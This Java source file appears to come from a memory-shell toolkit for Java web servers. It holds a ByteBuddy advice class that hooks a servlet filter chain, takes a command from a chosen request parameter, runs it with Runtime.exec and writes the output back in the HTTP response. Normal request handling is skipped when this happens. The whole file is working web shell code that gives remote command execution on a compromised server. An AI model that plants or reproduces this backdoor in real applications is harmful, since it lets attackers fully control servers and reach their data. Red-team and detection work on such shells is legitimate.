package com.reajason.javaweb.memshell.shelltool.command;

import net.bytebuddy.asm.Advice;

import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.InputStream;

/**
 * @author ReaJason
 */
public class CommandFilterChainAdvisor {
    public static String paramName;

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 0) ServletRequest request,
            @Advice.Argument(value = 1) ServletResponse response
    ) {
        String cmd = request.getParameter(paramName);
        try {
            if (cmd != null) {
                System.out.println(cmd);
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                ServletOutputStream outputStream = response.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
                return true;
            }
        } catch (Exception ignored) {
        }
        return false;
    }
}